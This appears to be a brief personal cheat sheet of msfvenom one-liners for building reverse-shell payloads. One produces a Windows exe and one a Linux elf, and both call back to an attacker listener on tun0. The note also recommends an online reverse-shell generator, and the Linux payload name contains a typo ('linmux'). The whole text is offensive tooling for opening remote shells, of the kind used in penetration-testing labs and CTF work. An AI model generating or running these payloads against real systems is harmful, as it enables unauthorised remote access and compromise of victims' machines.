Compiling some one liners that can be used 
also note revshell online is pretty good

Basic format (windows)
	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<listen_port> -f exe -o shell.exe

Basic format (linux)
	use to create .elf files (linux executables) -- kinda rare/niche use case
	`msfvenom -p linmux/x64/shell_reverse_tcp LHOST=tun0 LPORT=<listen_port> -f elf -o shell.elf
`